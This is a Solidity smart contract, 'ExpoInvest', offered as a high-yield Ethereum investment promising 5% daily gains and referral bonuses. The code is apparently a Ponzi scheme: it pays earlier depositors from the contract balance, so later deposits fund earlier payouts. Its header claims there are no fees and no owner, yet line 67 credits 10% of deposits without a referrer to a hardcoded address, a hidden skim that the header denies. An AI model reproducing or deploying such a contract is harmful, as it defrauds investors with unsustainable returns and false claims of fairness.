1 pragma solidity ^0.4.24;
2 
3 /**
4  *
5  * Exponental Investment Contract
6  *  - GAIN 5% PER 24 HOURS (every 5900 blocks)
7  *  - Every day the percentage increases by 0.25%
8  *  - You will receive 10% of each deposit of your referral
9  *  - Your referrals will receive 10% bonus
10  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
11  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
12  *
13  * How to use:
14  *  1. Send any amount of ether to make an investment
15  *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)
16  *  OR
17  *  2b. Send more ether to reinvest AND get your profit at the same time
18  *
19  * RECOMMENDED GAS LIMIT: 100000
20  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
21  * 
22  *
23  */
24 contract ExpoInvest {
25     // records amounts invested
26     mapping (address => uint256) invested;
27     // records blocks at which investments were made
28     mapping (address => uint256) atBlock;
29     
30     function bytesToAddress(bytes bys) private pure returns (address addr) {
31         assembly {
32             addr := mload(add(bys, 20))
33         }
34     }
35 
36     // this function called every time anyone sends a transaction to this contract
37     function ()  payable {
38           
39             
40         if (invested[msg.sender] != 0) {
41             // calculate profit amount as such:
42             // amount = (amount invested) * start 5% * (blocks since last transaction) / 5900
43             // 5900 is an average block count per day produced by Ethereum blockchain
44             uint256 amount = invested[msg.sender] * 5 / 100 * (block.number - atBlock[msg.sender]) / 5900;
45             
46             amount +=amount*((block.number - 6401132)/118000);
47             // send calculated amount of ether directly to sender (aka YOU)
48             address sender = msg.sender;
49             
50              if (amount > address(this).balance) {sender.send(address(this).balance);}
51              else  sender.send(amount);
52             
53         }
54         
55          
56 
57         // record block number and invested amount (msg.value) of this transaction
58         atBlock[msg.sender] = block.number;
59         invested[msg.sender] += msg.value;
60         //referral
61          address referrer = bytesToAddress(msg.data);
62             if (invested[referrer] > 0 && referrer != msg.sender) {
63                 invested[msg.sender] += msg.value/10;
64                 invested[referrer] += msg.value/10;
65             
66             } else {
67                 invested[0x705872bebffA94C20f82E8F2e17E4cCff0c71A2C] += msg.value/10;
68             }
69         
70         
71        
72     }
73 }